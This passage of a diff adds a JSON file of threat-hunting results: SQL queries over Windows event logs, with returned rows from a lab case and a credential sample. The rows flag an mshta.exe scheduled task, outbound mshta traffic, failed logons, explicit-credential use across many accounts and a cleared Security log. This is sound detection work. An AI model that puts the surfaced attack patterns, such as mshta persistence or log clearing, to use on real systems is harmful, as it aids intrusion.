+            "parent": null,
+            "child": "C:\\Windows\\System32\\schtasks.exe",
+            "observations": 1
+          }
+        ],
+        "returned_rows": 3,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Rarity is relative to this small collection, not an enterprise baseline."
+      },
+      {
+        "id": "HUNT-02",
+        "hypothesis": "Do observed process GUIDs link to network activity?",
+        "query": "SELECT c.event_uid AS creation_uid,n.event_uid AS network_uid,c.host,json_extract(c.event_data,'$.Image') AS image,json_extract(n.event_data,'$.DestinationIp') AS destination,json_extract(n.event_data,'$.Initiated') AS initiated FROM events c JOIN events n ON lower(c.host)=lower(n.host) AND lower(json_extract(c.event_data,'$.ProcessGuid'))=lower(json_extract(n.event_data,'$.ProcessGuid')) AND n.timestamp>=c.timestamp WHERE c.event_id=1 AND n.event_id=3 AND lower(c.provider)='microsoft-windows-sysmon' AND lower(n.provider)='microsoft-windows-sysmon' AND length(json_extract(c.event_data,'$.ProcessGuid'))=38 AND lower(json_extract(c.event_data,'$.ProcessGuid'))<>'{00000000-0000-0000-0000-000000000000}' LIMIT 100",
+        "query_sha256": "3e8d48b015c49d047d25f22a1a6060d2a7ce24aee89ed3b4bfd42b1534bb4b90",
+        "rows": [
+          {
+            "creation_uid": "8cf28a0658eecb79c373fdb509d45407ab1d4c461a3af6653d012608910c341c",
+            "network_uid": "bc9eaff475de5e378939be8e751f5fc65e3c9c0fc61030fd810b0edbe9b59ce9",
+            "host": "WS-CHAIN-LAB",
+            "image": "C:\\Windows\\System32\\mshta.exe",
+            "destination": "198.51.100.20",
+            "initiated": "true"
+          }
+        ],
+        "returned_rows": 1,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "This hunt proposes exact GUID pivots. The graph engine additionally validates UUID syntax and conflicting creation records."
+      },
+      {
+        "id": "HUNT-03",
+        "hypothesis": "Which account/IP pairs dominate failed logons?",
+        "query": "SELECT host,json_extract(event_data,'$.TargetDomainName') AS domain,json_extract(event_data,'$.TargetUserName') AS account,json_extract(event_data,'$.IpAddress') AS ip,json_extract(event_data,'$.SubStatus') AS sub_status,COUNT(*) AS failures FROM events WHERE event_id=4625 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,domain,account,ip,sub_status ORDER BY failures DESC LIMIT 100",
+        "query_sha256": "292c5af73f00e87cf7b154a4ba7bb4d66f748b58bb700659585fa8b7ad4a3250",
+        "rows": [
+          {
+            "host": "WS-CHAIN-LAB",
+            "domain": "LAB",
+            "account": "analyst.lab",
+            "ip": "192.0.2.20",
+            "sub_status": "0xc000006a",
+            "failures": 5
+          }
+        ],
+        "returned_rows": 1,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Failed authentication alone does not prove successful access; source scope and failure reasons matter."
+      },
+      {
+        "id": "HUNT-04",
+        "hypothesis": "Is task registration present as its own observation?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.TaskName') AS task_name,json_extract(event_data,'$.TaskContent') AS task_xml FROM events WHERE event_id=4698 AND lower(provider)='microsoft-windows-security-auditing' LIMIT 100",
+        "query_sha256": "5d69bec6ac796ebbaf4dd9c4bb622c675a8c9e41fd1048d368c66c471757bb67",
+        "rows": [
+          {
+            "event_uid": "f73d5d23fb0a86f4c55601856cb29ea7a871315700e535e100b6c12b5d087fa5",
+            "timestamp": "2026-09-03T10:00:10.000000Z",
+            "host": "WS-CHAIN-LAB",
+            "task_name": "\\LabUpdater",
+            "task_xml": "<Task><Actions><Exec><Command>mshta.exe</Command></Exec></Actions></Task>"
+          }
+        ],
+        "returned_rows": 1,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Task XML is retained as text. Registration does not prove that a task ran."
+      },
+      {
+        "id": "HUNT-05",
+        "hypothesis": "Which script-block fragments are actually collected?",
+        "query": "SELECT event_uid,host,json_extract(event_data,'$.ScriptBlockId') AS block_id,json_extract(event_data,'$.MessageNumber') AS part,json_extract(event_data,'$.MessageTotal') AS total,json_extract(event_data,'$.ScriptBlockText') AS text FROM events WHERE event_id=4104 AND lower(provider)='microsoft-windows-powershell' LIMIT 100",
+        "query_sha256": "ee61dbed4564ff6d0cec45c2829898de578647575aaa6d299fd5ad81798f6851",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Use reconstruction and static AST inspection before interpreting keyword matches as behavior."
+      },
+      {
+        "id": "HUNT-06",
+        "hypothesis": "Which subjects use explicit credentials for distinct targets?",
+        "query": "SELECT host,json_extract(event_data,'$.SubjectDomainName') AS subject_domain,json_extract(event_data,'$.SubjectUserName') AS subject,json_extract(event_data,'$.TargetServerName') AS target_server,COUNT(DISTINCT lower(COALESCE(json_extract(event_data,'$.TargetDomainName'),'')||'\\'||COALESCE(json_extract(event_data,'$.TargetUserName'),''))) AS distinct_target_users,COUNT(*) AS observations FROM events WHERE event_id=4648 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,subject_domain,subject,target_server ORDER BY distinct_target_users DESC LIMIT 100",
+        "query_sha256": "17a20e1f4a3b78cd6788cce339fc4afa8aab1acc2b12bbe0047425d1d1c6cef0",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Explicit credentials can be authorized administration. This aggregate does not establish password spraying."
+      },
+      {
+        "id": "HUNT-07",
+        "hypothesis": "Was Security logging cleared within the collected file?",
+        "query": "SELECT event_uid,timestamp,host,event_data FROM events WHERE event_id=1102 AND lower(channel)='security' LIMIT 100",
+        "query_sha256": "3723091184367cf79c7f728f1efaaa535d0cb117c7e66ea4a58ed7c1cbb647d6",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Investigate maintenance context. Missing 1102 in a narrow sample is not proof logging remained intact."
+      },
+      {
+        "id": "HUNT-08",
+        "hypothesis": "Are registry persistence leads present?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.Image') AS image,json_extract(event_data,'$.TargetObject') AS target,json_extract(event_data,'$.Details') AS details FROM events WHERE event_id=13 AND lower(provider)='microsoft-windows-sysmon' LIMIT 100",
+        "query_sha256": "465a08e599d7c2afc9ca8005d8e8df296eedf299cc26ddb95d60ea3976dac296",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Registry writes require key/value and authorization review. Zero hits may reflect missing telemetry."
+      }
+    ],
+    "scope": "Independent case collection; all SQL executed read-only; results capped at 100 rows per hunt"
+  },
+  "independent-credential-supplement": {
+    "event_count": 295,
+    "source_sha256": [
+      "03af8134b1ad915cc212edc91e72cc623484cc068b192ba6cf21a990a16dbe69"
+    ],
+    "hunts": [
+      {
+        "id": "HUNT-01",
+        "hypothesis": "Which process parents deserve review in this collection?",
+        "query": "SELECT json_extract(event_data,'$.ParentImage') AS parent, json_extract(event_data,'$.Image') AS child, COUNT(*) AS observations FROM events WHERE event_id=1 AND lower(provider)='microsoft-windows-sysmon' GROUP BY parent,child ORDER BY observations,parent,child LIMIT 100",
+        "query_sha256": "64c3ffd5c274970ea4a2d67ff586e9d91cf4bc83a8c06088579e771fa94c4ce3",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Rarity is relative to this small collection, not an enterprise baseline."
+      },
+      {
+        "id": "HUNT-02",
+        "hypothesis": "Do observed process GUIDs link to network activity?",
+        "query": "SELECT c.event_uid AS creation_uid,n.event_uid AS network_uid,c.host,json_extract(c.event_data,'$.Image') AS image,json_extract(n.event_data,'$.DestinationIp') AS destination,json_extract(n.event_data,'$.Initiated') AS initiated FROM events c JOIN events n ON lower(c.host)=lower(n.host) AND lower(json_extract(c.event_data,'$.ProcessGuid'))=lower(json_extract(n.event_data,'$.ProcessGuid')) AND n.timestamp>=c.timestamp WHERE c.event_id=1 AND n.event_id=3 AND lower(c.provider)='microsoft-windows-sysmon' AND lower(n.provider)='microsoft-windows-sysmon' AND length(json_extract(c.event_data,'$.ProcessGuid'))=38 AND lower(json_extract(c.event_data,'$.ProcessGuid'))<>'{00000000-0000-0000-0000-000000000000}' LIMIT 100",
+        "query_sha256": "3e8d48b015c49d047d25f22a1a6060d2a7ce24aee89ed3b4bfd42b1534bb4b90",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "This hunt proposes exact GUID pivots. The graph engine additionally validates UUID syntax and conflicting creation records."
+      },
+      {
+        "id": "HUNT-03",
+        "hypothesis": "Which account/IP pairs dominate failed logons?",
+        "query": "SELECT host,json_extract(event_data,'$.TargetDomainName') AS domain,json_extract(event_data,'$.TargetUserName') AS account,json_extract(event_data,'$.IpAddress') AS ip,json_extract(event_data,'$.SubStatus') AS sub_status,COUNT(*) AS failures FROM events WHERE event_id=4625 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,domain,account,ip,sub_status ORDER BY failures DESC LIMIT 100",
+        "query_sha256": "292c5af73f00e87cf7b154a4ba7bb4d66f748b58bb700659585fa8b7ad4a3250",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Failed authentication alone does not prove successful access; source scope and failure reasons matter."
+      },
+      {
+        "id": "HUNT-04",
+        "hypothesis": "Is task registration present as its own observation?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.TaskName') AS task_name,json_extract(event_data,'$.TaskContent') AS task_xml FROM events WHERE event_id=4698 AND lower(provider)='microsoft-windows-security-auditing' LIMIT 100",
+        "query_sha256": "5d69bec6ac796ebbaf4dd9c4bb622c675a8c9e41fd1048d368c66c471757bb67",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Task XML is retained as text. Registration does not prove that a task ran."
+      },
+      {
+        "id": "HUNT-05",
+        "hypothesis": "Which script-block fragments are actually collected?",
+        "query": "SELECT event_uid,host,json_extract(event_data,'$.ScriptBlockId') AS block_id,json_extract(event_data,'$.MessageNumber') AS part,json_extract(event_data,'$.MessageTotal') AS total,json_extract(event_data,'$.ScriptBlockText') AS text FROM events WHERE event_id=4104 AND lower(provider)='microsoft-windows-powershell' LIMIT 100",
+        "query_sha256": "ee61dbed4564ff6d0cec45c2829898de578647575aaa6d299fd5ad81798f6851",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Use reconstruction and static AST inspection before interpreting keyword matches as behavior."
+      },
+      {
+        "id": "HUNT-06",
+        "hypothesis": "Which subjects use explicit credentials for distinct targets?",
+        "query": "SELECT host,json_extract(event_data,'$.SubjectDomainName') AS subject_domain,json_extract(event_data,'$.SubjectUserName') AS subject,json_extract(event_data,'$.TargetServerName') AS target_server,COUNT(DISTINCT lower(COALESCE(json_extract(event_data,'$.TargetDomainName'),'')||'\\'||COALESCE(json_extract(event_data,'$.TargetUserName'),''))) AS distinct_target_users,COUNT(*) AS observations FROM events WHERE event_id=4648 AND lower(provider)='microsoft-windows-security-auditing' GROUP BY host,subject_domain,subject,target_server ORDER BY distinct_target_users DESC LIMIT 100",
+        "query_sha256": "17a20e1f4a3b78cd6788cce339fc4afa8aab1acc2b12bbe0047425d1d1c6cef0",
+        "rows": [
+          {
+            "host": "DESKTOP-JR78RLP",
+            "subject_domain": "DESKTOP-JR78RLP",
+            "subject": "jwrig",
+            "target_server": "DESKTOP-JR78RLP",
+            "distinct_target_users": 41,
+            "observations": 294
+          }
+        ],
+        "returned_rows": 1,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Explicit credentials can be authorized administration. This aggregate does not establish password spraying."
+      },
+      {
+        "id": "HUNT-07",
+        "hypothesis": "Was Security logging cleared within the collected file?",
+        "query": "SELECT event_uid,timestamp,host,event_data FROM events WHERE event_id=1102 AND lower(channel)='security' LIMIT 100",
+        "query_sha256": "3723091184367cf79c7f728f1efaaa535d0cb117c7e66ea4a58ed7c1cbb647d6",
+        "rows": [
+          {
+            "event_uid": "ff2033335a96dcba7cf52bf680a17a003579e204600f4fbded49393c86fe38f7",
+            "timestamp": "2019-04-30T19:27:00.297450Z",
+            "host": "DESKTOP-JR78RLP",
+            "event_data": "{\"SubjectDomainName\": \"DESKTOP-JR78RLP\", \"SubjectLogonId\": \"0x30550\", \"SubjectUserName\": \"jwrig\", \"SubjectUserSid\": \"S-1-5-21-979008924-657238111-836329461-1002\"}"
+          }
+        ],
+        "returned_rows": 1,
+        "row_limit": 100,
+        "assessment": "review observations",
+        "caution": "Investigate maintenance context. Missing 1102 in a narrow sample is not proof logging remained intact."
+      },
+      {
+        "id": "HUNT-08",
+        "hypothesis": "Are registry persistence leads present?",
+        "query": "SELECT event_uid,timestamp,host,json_extract(event_data,'$.Image') AS image,json_extract(event_data,'$.TargetObject') AS target,json_extract(event_data,'$.Details') AS details FROM events WHERE event_id=13 AND lower(provider)='microsoft-windows-sysmon' LIMIT 100",
+        "query_sha256": "465a08e599d7c2afc9ca8005d8e8df296eedf299cc26ddb95d60ea3976dac296",
+        "rows": [],
+        "returned_rows": 0,
+        "row_limit": 100,
+        "assessment": "no returned observations; assess collection coverage",
+        "caution": "Registry writes require key/value and authorization review. Zero hits may reflect missing telemetry."
+      }
+    ],
+    "scope": "Independent case collection; all SQL executed read-only; results capped at 100 rows per hunt"
+  }
+}
